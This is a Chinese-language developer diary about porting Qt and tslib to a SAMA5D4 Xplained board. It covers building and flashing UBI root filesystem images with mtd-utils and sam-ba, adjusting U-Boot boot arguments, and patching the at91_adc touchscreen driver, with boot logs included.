	然后qtbase/mkspecs/linux-arm-gnueabi-g++/qmake.conf添加:
		QMAKE_INCDIR_OPENGL   = /usr/include/GL
		QMAKE_LIBDIR_OPENGL   = /usr/lib
		QMAKE_LIBS_OPENGL     = -lGLU -lGL	
	依然错误:	All the OpenGL functionality tests failed!
	网上参考:
		如果需要openGL，就需要用 -opengl选项指定opengl的api，对于嵌入式平台，一般使用 opengl ES2，配置选项中加入" -opengl es2 " 。
		不过想使用openGL可能会比较麻烦，因为openGL一般在有硬件图形加速的条件下才能高效运行，而这需要显卡或Soc厂家提供openGL的支持库，
		但并不是所有Soc都能找到对应的支持库，比如三星就没有提供S5PV210的openGL库，所以我这里编译的Qt也是没有opengl的。
		(openGL的替代方案：如果没有厂家提供的硬件图形库，可以考虑使用纯软件实现的opengl，这样的软件库有很多是开源的，如mesa3D库等，
		不过纯软件实现的opengl在效率方面肯定要比带硬件加速的低很多，而且要想在嵌入式平台上使用，必须将opengl的软件库也交叉编译出来，
		我在交叉编译mesa3D时遇到了些问题，所以目前还没能在开发板上用上openGL)；
	还是先放弃 opengl:
		








20170204
昨天编译QT 一直卡在qtcanvas3d编译失败,原因是需要用到opengl模块,但是并没有加载安装使用oepngl 所以试图先跳过qtcanvas与qt3d 
然而按晚上参考的 qt.pro里没有对应项给予更改!!!
不过知道了,虽然卡在了canvas3d上,但是qt的主体部分已经编译完成!!!
所以直接make install 输出生成文件!!!
现在的工作是拷到文件系统里,做测试!!!
由于没有使用nfs 所以,先学习制作 ubi文件系统!!!

以下实验基于yocto项目生成好文件系统镜像展开,并所有实验内容都放在:/home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1 里
解压一个ubi镜像:
网上参考(走运,直接找到sama5d4_xpl的): http://blog.csdn.net/andylao62/article/details/50750404
	sudo apt-get install mtd-utils //安装mtd-utils
	//sama5d4ek or sama5d4_xplained board, the nand flash is different, 
	//so use following line to do the nandsim, change the page size to 4096.
	sudo modprobe nandsim first_id_byte=0x2c second_id_byte=0xdc third_id_byte=0x90 fourth_id_byte=0xa6	
	sudo modprobe ubi mtd=0
	sudo ubidetach /dev/ubi_ctrl -m 0
	sudo ubiformat /dev/mtd0 -s 4096 -f xxxx.ubi 	//2048 改为 4096
	sudo ubiattach /dev/ubi_ctrl -m 0 -O 4096	//2048 改为 4096
	sudo mkdir /mnt/loop
	sudo mount -t ubifs ubi0 /mnt/loop
	sudo cp -R /mnt/loop/* ./xxxfs 		//把内容全部拷到xxxfs文件夹里!! */
	//注意,不同的 nandflash 匹配不同的 nandsim 和 page size 以下nandsim 不是sama5d4开发板所用nandflash对应的nandsim 
要根据自己机器的情况来选择：
modprobe nandsim first_id_byte=0x20 second_id_byte=0x33 - 16MiB, 512 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0x35 - 32MiB, 512 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0x36 - 64MiB, 512 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0x78 - 128MiB, 512 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0x71 - 256MiB, 512 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0xa2 third_id_byte=0x00 fourth_id_byte=0x15 - 64MiB, 2048 bytes page;
modprobe nandsim first_id_byte=0xec second_id_byte=0xa1 third_id_byte=0x00 fourth_id_byte=0x15 - 128MiB, 2048 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0xaa third_id_byte=0x00 fourth_id_byte=0x15 - 256MiB, 2048 bytes page;
modprobe nandsim first_id_byte=0x20 second_id_byte=0xac third_id_byte=0x00 fourth_id_byte=0x15 - 512MiB, 2048 bytes page;
modprobe nandsim first_id_byte=0xec second_id_byte=0xd3 third_id_byte=0x51 fourth_id_byte=0x95 - 1GiB, 2048 bytes page;我昨天解包的时候就是在这里搞错了（我的机器需要4096 bytes page），然后再最后mount的时候老是mount不上，记住这步至关重要！ 5，检查加入模块的环境

附加:解压JFFS2 images
	sudo modprobe nandsim first_id_byte=0x2c second_id_byte=0xda third_id_byte=0x00 fourth_id_byte=0x15
	sudo modprobe mtdblock
	sudo modprobe mtdchar
	sudo modprobe mtd mtd=0
	sudo dd if=xxxxxxxxjffs2 of=/dev/mtd0
	sudo mkdir /mnt/loop
	sudo mount -t jffs2 /dev/mtdblock0 /mnt/loop
	sudo cp -R /mnt/loop/* ./xxxfs	//把内容全部拷到xxxfs文件夹里!! */

然后压缩成一个 ubi 镜像!!!
	//假如现在处于 rootfs1 ,把 rootfs1/minfs 整个文件夹制作成ubi文件系统
	sudo mkfs.ubifs -r /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs -m 4KiB -e 248KiB -c 2048 -o minfs.ubifs
	//mkfs.ubifs 制作成 ubifs镜像
	//-r 要制作成镜像的文件夹路径
	//-m nandflash 的 page 大小
	//-e 逻辑擦除块大小 block 大小, 每个物理块有2个4KiB(2个page)是由系统管理不可被用户使用的,所以不可被擦除,所以大小是248KiB,非256KiB
	//-c 有多少个逻辑擦除块
	//-o 生成镜像的名字!!!
	sudo ubinize -o minfs.ubi -m 4KiB -p 256KiB -s 4096 -O 4096 ubinize.cfg
	//mkfs.ubifs 制作成 ubi 二进制镜像
	//-m nandflash 的 page 大小
	//-p 物理块大小(物理块就是 逻辑擦除块 + 由系统管理不可被用户使用的空间)
	//-s 给 ubi文件系统头信息所使用的空间 一般等于一个对应的 nandflash page大小
	//-O 逻辑擦除块 距物理块开始位置的偏移量,一般为一个 由系统管理不可被用户使用的空间
	ubinize.cfg : 配置文件
[rootfs-volume]  
mode=ubi
image=/home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs.ubifs
vol_id=0
vol_size=520MiB  
vol_type=dynamic
vol_name=min-rootfs
vol_flags=autoresize
	//生成镜像加载失败!!!
	由于知道了 mkfs.ubifs 通过追踪 yocto项目此命令的使用途径就可以跟踪到具体出错处,
	最后挖掘到  成功生成镜像并执行  的命令集!!! (并且是把解压的 ubi文件 重新打包生成镜像执行,说明,解压的方法也是正确的!!)
	sudo mkfs.ubifs -r /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs -o minfs.ubifs -e 0x3e000 -c 2082 -m 0x1000 -x lzo
	//-e 0x3e000	即 248KiB 与上面的指令的参数及意义一样
	//-c 2082	2082 表示理论上有2082个逻辑块, 意味着2082个物理块,意味着理论上文件系统应管理的nandflash磁盘空间有520MiB
	//-m 0x1000	即 4KiB 与上面的指令的参数及意义一样	
	//-x lzo	强调 制作成 .ubifs 镜像是 lzo 压缩格式
	sudo ubinize -o minfs.ubi -m 0x1000 -p 0x40000 ubinize.cfg
	//-m 0x1000	即 4KiB 与上面的指令的参数及意义一样	
	//-p 0x40000	即 256KiB 与上面的指令的参数及意义一样
	//此外并没有设置 -s -O 参数,任其自动使用默认值
	ubinize.cfg : 配置文件
[rootfs-volume]		//名字顺便改,不参与内核识别,只便于程序员阅读
mode=ubi
image=/home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs.ubifs
vol_id=0		//内核会识别
vol_size=480MiB 	//虽然 yocto 工程里面没有,但是这里一定要加入!!
vol_type=dynamic
vol_name=rootfs		//内核会识别ubi文件系统的名称,所以不能乱改,只能是 rootfs 这个名字
vol_flags=autoresize
	//特别注意:vol_size=480MiB 这一项,对比yocto工程发现,yocto工程里对应的ubinize.cfg本身没有这一项!!
	//yocto工程使用工程自带封闭的 mkfs.ubifs 工具来编译生成 ubi文件系统镜像,与我使用的 mkfs.ubifs 工具 可能版本不一样
	//所以yocto工程里对应的ubinize.cfg可以没有这一项,但是我的没有这一项vol_size=.. 使用ubinize时便会报错:
ubinize: volume size was not specified in section "rootfs-volume", assume minimum to fit image "/home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs.ubifs"6602752 bytes (6.3 MiB)
	//而vol_size=480MiB 的值也有讲究:
	//上面曾设置为: vol_size=520MiB,而 mkfs.ubifs 参数-c 2082 也暗示这个文件系统将可以管理nandflash磁盘空间有520MiB
	//然而加载时出错:
ubi0 error: vtbl_check: too large reserved_pebs 2165, good PEBs 2012
	//这里表示内核运行时会扫描nandflash,会把坏的物理块标记,最后告知,只剩下2012个可用物理快,表明实际可被使用的空间 只有500MiB左右,
	//并没有520MiB那么多, 而且,对于文件系统说,内核 与 bootloader 与 dtb 占据的空间不可访问,
	//所以实际上 文件系统将可以管理nandflash磁盘空间或许只能是480MiB左右,文件系统不可能写入多于这个量的内容到磁盘上
	//所以 vol_size=520MiB 时会出错,提示,磁盘实际上没有这么多空间!!!!!

	成功运行 自己制作的ubi镜像的log信息
/* log : start */
ubi0: attaching mtd7
random: nonblocking pool is initialized
ubi0: scanning is finished
ubi0 warning: print_rsvd_warning: cannot reserve enough PEBs for bad PEB handling, reserved 26, need 36
ubi0: volume 0 ("rootfs") re-sized from 1982 to 1982 LEBs
ubi0: attached mtd7 (name "rootfs", size 504 MiB)
ubi0: PEB size: 262144 bytes (256 KiB), LEB size: 253952 bytes
ubi0: min./max. I/O unit sizes: 4096/4096, sub-page size 4096
ubi0: VID header offset: 4096 (aligned 4096), data offset: 8192
ubi0: good PEBs: 2012, bad PEBs: 4, corrupted PEBs: 0
ubi0: user volume: 1, internal volumes: 1, max. volumes count: 128
ubi0: max/mean erase counter: 1/0, WL threshold: 4096, image sequence number: 1337189846
ubi0: available PEBs: 0, total reserved PEBs: 2012, PEBs reserved for bad PEB handling: 26
ubi0: background thread "ubi_bgt0d" started, PID 662
at91_rtc fc0686b0.rtc: setting system clock to 2017-01-16 21:01:12 UTC (1484600472)
panel-power-supply: disabling
ALSA device list:
  No soundcards found.
UBIFS (ubi0:0): UBIFS: mounted UBI device 0, volume 0, name "rootfs", R/O mode
UBIFS (ubi0:0): LEB size: 253952 bytes (248 KiB), min./max. I/O unit sizes: 4096 bytes/4096 bytes
UBIFS (ubi0:0): FS size: 500793344 bytes (477 MiB, 1972 LEBs), journal size 9404416 bytes (8 MiB, 38 LEBs)
UBIFS (ubi0:0): reserved for root: 0 bytes (0 KiB)
UBIFS (ubi0:0): media format: w4/r0 (latest is w4/r0), UUID 9B79CCE3-363E-40CB-9F39-03BF4EF7F87B, small LPT model
VFS: Mounted root (ubifs filesystem) readonly on device 0:14.
devtmpfs: mounted
Freeing unused kernel memory: 200K (c068c000 - c06be000)
INIT: version 2.88 booting
Starting udev
udevd[692]: starting version 3.1.5
open_ts!
ubi0 error: ubi_open_volume: cannot open device 0, volume 0, error -16
ubi0 error: ubi_open_volume: cannot open device 0, volume 0, error -16
UBIFS (ubi0:0): background thread "ubifs_bgt0_0" started, PID 721
Populating dev cache
/* log : end */

通过学习制作ubi格式文件系统!!更深刻地了解了文件系统的运作!!!
	从 ubi 文件系统来分析!!!
	首先在打包成ubi镜像前的 根文件目录里的内容只不过是普通的文件内容而已,并不是文件系统本身!
	内核完成启动后,就开始访问既定的用户内容了,而这些内容就是我们知道的放在根文件目录里的各项内容,
	内核如何访问和执行这些内容?
		首先,从硬件低层看,文件内容是分割成各个部分 存放在各个 page 和物理块上,
		要有效率地取得内核想要的内容,我们就得及建立关于文件内容在底层硬件里存放的框架协议,例如 ubi 这种框架
		文件内容按照 ubi 这种框架规范,分布存放在磁盘各处,
		而对应地,内核本身就有内置了遵从 ubi 这种规格收集文件内容的api函数,内核就可以方便地访问自己想要的内容了
		就好像,图书按ubi规则放到图书馆每个角落,而相当于人的内核,因为知道书本摆放规则,遵从ubi规则,很快就可以找到书本一样,
		按规则分布摆放在磁盘的内容,磁盘,还有内核内置的遵从规则收集所需内容的api 共同组成的才叫文件系统!!!
	那么文件系统镜像又是什么一回事?
		一般,linux系统,很多重要的功能都不能直接内置到内核里,这样内核会变得很大,根本不能很好维护,甚至工作效率低下,
		于是吧他们制作成文件内容,让内核启动后再访问磁盘找到他们然后执行!!
		如果真有这么一个奇葩,就是喜欢吧所有功能都往内核塞,那么,的确,我们约定俗成的根文件目录里可以什么都没有!!
		正因为,这些文件内容是必须的,又不推荐内置到内核里,所以,这些内容得在内核甚至机子启动之前就放入磁盘里
		文件系统镜像的一部分内容就是,这些必要的文件内容 按照 ubi框架规矩,符合nandflash硬件属性 排布成二进制数据块,
		然后 原封不动地拷到 物理介质nandflash里,
		相当于 有一个按照ubi规则放好图书的大书柜,连柜带书直接搬进图书馆,人可以直接遵从ubi规则,找书.
		当内核启动后,内核就可以去找要找的内容直接执行了!!
		文件系统镜像的另一部分内容,就是关于ubi框架的内容了,
		nandflash空间几百M,然而文件系统镜像可能就几M,以前误认为,可用的磁盘空间等于文件系统镜像的大小,然而并不是这样!!!
		虽然文件系统镜像才几M,但是可用的磁盘空间可以是几百M
		内核启动时,使用ubi框架的文件系统时,会先,根据镜像里的 附加属性信息,把镜像外,属性标明里的其他nandflash空白空间
		也规范成 符合 ubi 框架的 文件管理空间.
		当有新文件写入到机子nandflash时, 内核便会管理分拆成符合ubi框架的数据块,然后分布写入这些空白空间.
		所以总的来说,镜像只有打包了的 已经符合ubi框架的数据块内容,还有一些关于ubi框架的附加信息外,一般并没有操作数据的api内容
		而操作的api一般都直接内置到内核内部,
		内核启动时会检测 镜像究竟是属于那一种 文件内容框架,是ubi的,还是其他,
		然后选择对应规则的api,然后按照规则初始化指定磁盘空间, 然后就可以遵从规则,搜集,读写,操作想要的文件或数据了
	以上是文件系统的通用认识,按转时代,需求不同,有更多新的特性出现!!!有些特性甚至有,有别于以上通识的改动,
	不过文件系统的角色不曾改变!!!









20170206
解压官方demo的ubi!!由于昨日已经解压实验时已做好了一些解压环境配置工作,今天不用重复做
新建 rootfs2文件夹,把工作内容都放进去:
cd /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs2
拷贝 atmel-xplained-demo-image-sama5d4-xplained.ubi 到此文件夹
sudo ubidetach /dev/ubi_ctrl -m 0
sudo ubiformat /dev/mtd0 -s 4096 -f atmel-xplained-demo-image-sama5d4-xplained.ubi
sudo ubiattach /dev/ubi_ctrl -m 0 -O 4096
sudo mount -t ubifs ubi0 /mnt/loop
sudo cp -R /mnt/loop/* ./demofs 	//把所有内容拷到 demofs 文件夹   */
官方 fs 的启动初始化log
/* log : start */
ubi0: attaching mtd7
random: nonblocking pool is initialized
ubi0: scanning is finished
ubi0: attached mtd7 (name "rootfs", size 504 MiB)
ubi0: PEB size: 262144 bytes (256 KiB), LEB size: 253952 bytes
ubi0: min./max. I/O unit sizes: 4096/4096, sub-page size 4096
ubi0: VID header offset: 4096 (aligned 4096), data offset: 8192
ubi0: good PEBs: 2012, bad PEBs: 4, corrupted PEBs: 0
ubi0: user volume: 1, internal volumes: 1, max. volumes count: 128
ubi0: max/mean erase counter: 3/0, WL threshold: 4096, image sequence number: 400630375
ubi0: available PEBs: 0, total reserved PEBs: 2012, PEBs reserved for bad PEB handling: 36
ubi0: background thread "ubi_bgt0d" started, PID 662
....
UBIFS (ubi0:0): recovery needed
UBIFS (ubi0:0): recovery deferred
UBIFS (ubi0:0): UBIFS: mounted UBI device 0, volume 0, name "rootfs", R/O mode
UBIFS (ubi0:0): LEB size: 253952 bytes (248 KiB), min./max. I/O unit sizes: 4096 bytes/4096 bytes
UBIFS (ubi0:0): FS size: 498253824 bytes (475 MiB, 1962 LEBs), journal size 9404416 bytes (8 MiB, 38 LEBs)
UBIFS (ubi0:0): reserved for root: 0 bytes (0 KiB)
UBIFS (ubi0:0): media format: w4/r0 (latest is w4/r0), UUID D094325A-A0E6-490A-8A23-FAC662B80F50, small LPT model
VFS: Mounted root (ubifs filesystem) readonly on device 0:14.
devtmpfs: mounted
Freeing unused kernel memory: 200K (c068c000 - c06be000)
INIT: version 2.88 booting
....
ubi0 error: ubi_open_volume: cannot open device 0, volume 0, error -16
Console: switching to colour frame buffer device 100x30
....
UBIFS (ubi0:0): completing deferred recovery
UBIFS (ubi0:0): background thread "ubifs_bgt0_0" started, PID 780
UBIFS (ubi0:0): deferred recovery completed
/* log : end */

重新压缩官方fs 成ubi镜像!!!!
sudo mkfs.ubifs -r /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs2/demofs -o demofs.ubifs -e 0x3e000 -c 2082 -m 0x1000 -x lzo
sudo ubinize -o demofs.ubi -m 0x1000 -p 0x40000 ubinize.cfg
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x800000:0x1f800000 -c write:demofs.ubi:0x800000
ubinize.cfg : 配置文件
	[rootfs-volume]		//名字顺便改,不参与内核识别,只便于程序员阅读
	mode=ubi
	image=/home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs.ubifs
	vol_id=0		//内核会识别
	vol_size=480MiB 	//虽然 yocto 工程里面没有,但是这里一定要加入!!
	vol_type=dynamic
	vol_name=rootfs		//内核会识别ubi文件系统的名称,所以不能乱改,只能是 rootfs 这个名字
	vol_flags=autoresize
重新压缩后 启动初始化log:
/* log : start */
ubi0: attaching mtd7
random: nonblocking pool is initialized
ubi0: scanning is finished
ubi0 warning: print_rsvd_warning: cannot reserve enough PEBs for bad PEB handling, reserved 26, need 36
ubi0: volume 0 ("rootfs") re-sized from 1982 to 1982 LEBs
ubi0: attached mtd7 (name "rootfs", size 504 MiB)
ubi0: PEB size: 262144 bytes (256 KiB), LEB size: 253952 bytes
ubi0: min./max. I/O unit sizes: 4096/4096, sub-page size 4096
ubi0: VID header offset: 4096 (aligned 4096), data offset: 8192
ubi0: good PEBs: 2012, bad PEBs: 4, corrupted PEBs: 0
ubi0: user volume: 1, internal volumes: 1, max. volumes count: 128
ubi0: max/mean erase counter: 1/0, WL threshold: 4096, image sequence number: 1392490045
ubi0: available PEBs: 0, total reserved PEBs: 2012, PEBs reserved for bad PEB handling: 26
ubi0: background thread "ubi_bgt0d" started, PID 662
.....
UBIFS (ubi0:0): UBIFS: mounted UBI device 0, volume 0, name "rootfs", R/O mode
UBIFS (ubi0:0): LEB size: 253952 bytes (248 KiB), min./max. I/O unit sizes: 4096 bytes/4096 bytes
UBIFS (ubi0:0): FS size: 500793344 bytes (477 MiB, 1972 LEBs), journal size 9404416 bytes (8 MiB, 38 LEBs)
UBIFS (ubi0:0): reserved for root: 0 bytes (0 KiB)
UBIFS (ubi0:0): media format: w4/r0 (latest is w4/r0), UUID 4F5D1854-E45F-4000-A706-55B47390EA4B, small LPT model
VFS: Mounted root (ubifs filesystem) readonly on device 0:14.
devtmpfs: mounted
.....
ubi0 error: ubi_open_volume: cannot open device 0, volume 0, error -16
/* log : end */

计划移植 QT 和 QT 库到 开发板去!!!
从demo的fs里 没有发现任何关于 gui 等相关的执行程序!!!
所以,不打算使用demofs 来移植qt,因为demofs现有的文件太多,再加上qt库的话,最后压缩的ubi镜像会很大!!!
所以选择移植到 minfs
之前 编译的qt库,虽然仍然卡在qtcanvas而还没有全部编译完,但是,主体库已经完成,可以进行移植:
之前,qt编译后,我设定是把所有编译生成文件都放在 rootfs1/armv7-a
1,
把 rootfs1/armv7-a 文件夹里所有内容 拷到 minfs/opt/qt
修改 minfs 的系统变量: minfs/etc/profile最后添加:
	PATH=$PATH:/sbin:/usr/sbin
	LD_LIBRARY_PATH=/lib:/usr/lib:$LD_LIBRARY_PATH
	export PATH LD_LIBRARY_PATH HOSTNAME USER PS1 LOGNAME HOME
	export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/qt/lib/		//添加qt库文件路径
	export QT_QPA_PLATFORM_PLUGIN_PATH=/opt/qt/plugins/platforms	//qt的平台模式
	export QT_QPA_PLATFORM=linuxfb:tty=/dev/fb0			//显示设备 fb0 即lcd屏
	export QT_QPA_FONTDIR=/opt/qt/lib/fonts  			//字体库
	export QT_QPA_GENERIC_PLUGINS=/dev/input/event0			//输入设备 event0 即触摸屏
	export LD_PRELOAD=/lib/preloadable_libiconv.so			//qt程序需要 libiconv库
2,
QT程序在运行时需要依赖libiconv库
下载：http://ftp.gnu.org/gnu/libiconv/libiconv-1.14.tar.gz
解压并进入对应 libiconv-1.14 目录
编译步骤：
在libiconv目录下：
$./configure --prefix=$PWD/temp --host=arm-linux-gnueabihf   //我们的编译器厂商是 arm-linux-gnueabihf
//参数
//--prefix=$PWD/temp  生成文件放置的目标文件夹
$make
$make install
上述命令执行完成后会在libiconv目录下生成新的temp目录，该目录下存在4个目录分别是：
bin include lib share
在lib目录下为生成的库文件，其中一个为preloadable_libiconv.so，
把它下载到开发板的lib目录下，然后再设置开发板的系统环境变量即可： minfs/etc/profile最后添加:
	export LD_PRELOAD=/lib/preloadable_libiconv.so
最后，开发板执行qt程序时，不会提示 iconv_open failed
3,
sudo mkfs.ubifs -r /home/infortech-ubuntu-1404/SAMA5D4/sources/rootfs/rootfs1/minfs -o demofs.ubifs -e 0x3e000 -c 2082 -m 0x1000 -x lzo
sudo ubinize -o minfs.ubi -m 0x1000 -p 0x40000 ubinize.cfg
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x800000:0x1f800000 -c write:minfs.ubi:0x800000
生产ubi镜像并烧入如开发板
4,
测试,执行 /opt/qt/examples 的qt demo程序测试
后来发现还是缺少各种库,先通过 arm-linux-gnueabihf-readelf -a xxxx|grep "lib" 查找xxxx执行文件的依赖库,
然后把所缺乏的库找到,或者编译好,然后拷到 minfs对应lib文件夹,
最后,
成功执行demo,但是显示界面和触摸屏问题多多!!!
	qtgui与log信息并行使用fb0,导致gui与log消息抢屏现象
	触摸位置不正确!!!
试图移植tslib改善,触摸位置问题!!!
编译安装 git clone 下来的新版本 tslib 並不是使用tslib-1.4
apt-get install autoconf
apt-get install automake
apt-get install libtool
git clone https://github.com/kergoth/tslib
cd tslib
./autogen.sh
echo "ac_cv_func_malloc_0_nonnull=yes" >arm-linux-gnueabihf.cache
./configure --host=arm-linux-gnueabihf --cache-file=arm-linux-gnueabihf.cache --prefix=/home/infortech-ubuntu-1404/SAMA5D4/sources/qt/tslib/tslib/finish
//--prefix 一定要绝对路径!!!
make
//input_raw.c ts_uinput.c 都提示 没有 ABS_MT_TOOL_X, ABS_MT_TOOL_Y
//mt是多点触控的内容
//但是在 input_raw.c 有define
//初步调查发现 这些定义应该在linux/input.h的,但是pc机撒谎嗯的linux/input.h没有
//修改 input_raw.c 和 ts_uinput.c 用input_raw.c上define的 ABS_MT_TOOL_X, ABS_MT_TOOL_Y
make install
把--prefix 路径里的所有内容拷到 minfs/opt/tslib
修改 etc/profile 最后添加:
export TSLIB_ROOT=/opt/tslib
export TSLIB_TSDEVICE=/dev/input/event0
export TSLIB_CONFFILE=$TSLIB_ROOT/etc/ts.conf
export TSLIB_PLUGINDIR=$TSLIB_ROOT/lib/ts
export TSLIB_CALIBFILE=/etc/pointercal
export TSLIB_CONSOLEDEVICE=none
export TSLIB_FBDEVICE=/dev/fb0
PATH=$PATH:/sbin:/usr/sbin:$TSLIB_ROOT/bin/
LD_LIBRARY_PATH=/lib:/usr/lib:$LD_LIBRARY_PATH
export PATH LD_LIBRARY_PATH HOSTNAME USER PS1 LOGNAME HOME
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$TSLIB_ROOT/lib:/opt/qt/lib/
export QT_QPA_PLATFORM_PLUGIN_PATH=/opt/qt/plugins/platforms
export QT_QPA_PLATFORM=linuxfb:tty=/dev/fb0
export QT_QPA_FONTDIR=/opt/qt/lib/fonts  
export QT_QPA_GENERIC_PLUGINS=tslib:/dev/input/event0
export LD_PRELOAD=/lib/preloadable_libiconv.so
但是失败!!
显示 fopen ts_config 文件not found
使用tslib1.4 重新制作,可以执行,但是 lcd没有显示的情况!!!
readelf 发现 ts_calibrate 的 library_rpath 有问题,是一个固定绝对的路径!!!这个路径对于开发板的文件系统来说据对是错的!!!!
所以,按照以下内容重新编译!!!!










20170207
继续处理tslib问题:
修改uboot 使得lcd不再作为一个console
uboot/include/configs/at91-sama5_common.h:
#define CONFIG_BOOTARGS							\
	"console=tty0 "							\
	"console=ttyS0,115200 earlyprintk "				\
	"mtdparts=atmel_nand:256k(bootstrap)ro,512k(uboot)ro,"		\
	"256K(env),256k(env_redundent),256k(spare),"			\
	"512k(dtb),6M(kernel)ro,-(rootfs) "				\
	"rootfstype=ubifs ubi.mtd=7 root=ubi0:rootfs"
改为:
#define CONFIG_BOOTARGS							\
	"console=ttyS0,115200 earlyprintk "				\
	"mtdparts=atmel_nand:256k(bootstrap)ro,512k(uboot)ro,"		\
	"256K(env),256k(env_redundent),256k(spare),"			\
	"512k(dtb),6M(kernel)ro,-(rootfs) "				\
	"rootfstype=ubifs ubi.mtd=7 root=ubi0:rootfs"
编译
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
烧写:
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x40000:0x80000 -c write:u-boot.bin:0x40000
启动开发板:
发现,已经没有作为console的大部分输出,但是还是有 please wait 和闪烁的命令字符光标.说现在的lcd屏作为 tty1 设备
执行qt demo 完美显示,但是 触摸屏错位,不能正确控制!!!!
另外通过,arm-linux-gnueabihf-readelf -a ts_calibrate|grep "lib"查看依赖库时,发现 library_rpath 涉及--prefix 的绝对路径
自然之前的编译移植tslib的方法自然不对!!!
由于我们要把生成的文件放到开发板的 /opt/tslib 里,所以--prefix设置成pc机的 /opt/tslib
./autogen.sh
echo "ac_cv_func_malloc_0_nonnull=yes" >arm-linux-gnueabihf.cache
./configure --host=arm-linux-gnueabihf --cache-file=arm-linux-gnueabihf.cache --prefix=/opt/tslib
make
make install
然后把pc上/opt/tslib里所有东西拷到 minfs/opt/tslib里,
设置 minfs/etc/profile
export TSLIB_ROOT=/opt/tslib
export TSLIB_TSDEVICE=/dev/input/event0
export TSLIB_CONFFILE=$TSLIB_ROOT/etc/ts.conf
export TSLIB_PLUGINDIR=$TSLIB_ROOT/lib/ts
export TSLIB_CALIBFILE=/etc/pointercal
export TSLIB_CONSOLEDEVICE=none
export TSLIB_FBDEVICE=/dev/fb0

PATH=$PATH:/sbin:/usr/sbin:$TSLIB_ROOT/bin/
LD_LIBRARY_PATH=/lib:/usr/lib:$LD_LIBRARY_PATH
export PATH LD_LIBRARY_PATH HOSTNAME USER PS1 LOGNAME HOME
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$TSLIB_ROOT/lib:/opt/qt/lib/
export QT_QPA_PLATFORM_PLUGIN_PATH=/opt/qt/plugins/platforms
export QT_QPA_PLATFORM=linuxfb:tty=/dev/fb0
export QT_QPA_FONTDIR=/opt/qt/lib/fonts  
export QT_QPA_GENERIC_PLUGINS=tslib:/dev/input/event0
export LD_PRELOAD=/lib/preloadable_libiconv.so
设置 minfs/opt/tslib/etc/ts.conf
# Uncomment if you wish to use the linux input layer event interface
module_raw input
.......
重新编译,烧写,
还是出现相同错误,串口端表示成功执行,但是lcd没有任何显示!!
后来发现yocto 工程里下了个 tslib1.1版,
同样方法移植tslib1.1
成功lcd显示和执行,但是,触摸屏出现严重的误差问题!!!!








20170208
检查触摸屏的问题!!!
先修改触摸屏的压力值统一为 2000:
at91_adc.c:at91_ts_sample()
	if (pres < st->ts_pressure_threshold) {
		//by william  (set intergrate pressure)  设置统一的压力值!!!!
		if(pres < 500)		//当笔尖离开触摸屏,即要发生key_up事件,要求压力值pres值等于0 来提示触犯key_up事件
			pres = 0;
		else
			pres = 2000;	//注意 有pres时,表示一直处于key_down 我们统一压力值2000

		dev_dbg(&idev->dev, "x = %d, y = %d, pressure = %d\n",
					x, y, pres / factor);
		input_report_abs(st->ts_input, ABS_X, x);
		input_report_abs(st->ts_input, ABS_Y, y);
		input_report_abs(st->ts_input, ABS_PRESSURE, pres);
		input_report_key(st->ts_input, BTN_TOUCH, 1);
		input_sync(st->ts_input);
	} else {
		dev_dbg(&idev->dev, "pressure too low: not reporting\n");
重现编译内核,烧写!!!
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x200000:0x600000 -c write:zImage:0x200000
经检测发现:
关于 key_up key_down 的事件是 又input_event来判断的 !!
report pres = 2000 和 BTN_TOUCH 1 后 input_event 识别为key_down事件
report pres = 0 和 BTN_TOUCH 0 后 input_event 识别为key_up事件
key_up与key_down事件并不是 由at91_adc.c本身来生成的,而是由input_event 识别生成的!!!
触摸屏不可能只有key_up事件而没有key_down事件!!
所以把pres只设定为一个值,是不正确的,应该按上面的根据情况起码设置两个值!0和某值!!
但是这种改法还是不好,
不是每一次手离开触摸屏时,芯片能及时采样到一个pres低于500 的压力值,
于是 pres = 2000 和 BTN_TOUCH 0 report到 input_event ,input_event 并不能分析是处于key_up抑或是key_down事件,
虽然把今次事件强制认为是key_up事件,但会把这种奇怪的情况记录下来,
这是如果ctrl+c结束ts_test,再重新启动ts_test后,因为保存上次奇怪情况,而不在后续不能正常地分析触摸事件
所以,要压力值统一为 2000:的最佳做法!!
at91_adc.c:at91_ts_sample()
	if (pres < st->ts_pressure_threshold) {
		//by william  (set intergrate pressure)  设置统一的压力值!!!!
		pres = 2000;	//我们统一压力值2000

		dev_dbg(&idev->dev, "x = %d, y = %d, pressure = %d\n",
					x, y, pres / factor);
		input_report_abs(st->ts_input, ABS_X, x);
		input_report_abs(st->ts_input, ABS_Y, y);
		input_report_abs(st->ts_input, ABS_PRESSURE, pres);
		input_report_key(st->ts_input, BTN_TOUCH, 1);
		input_sync(st->ts_input);
	} else {
		dev_dbg(&idev->dev, "pressure too low: not reporting\n");
而
at91_adc.c:irqreturn_t at91_adc_9x5_interrupt()

	} else if (status & AT91_ADC_IER_NOPEN) {

		//by william
		pr_debug("nopen\n");	//表示笔尖离开触摸屏

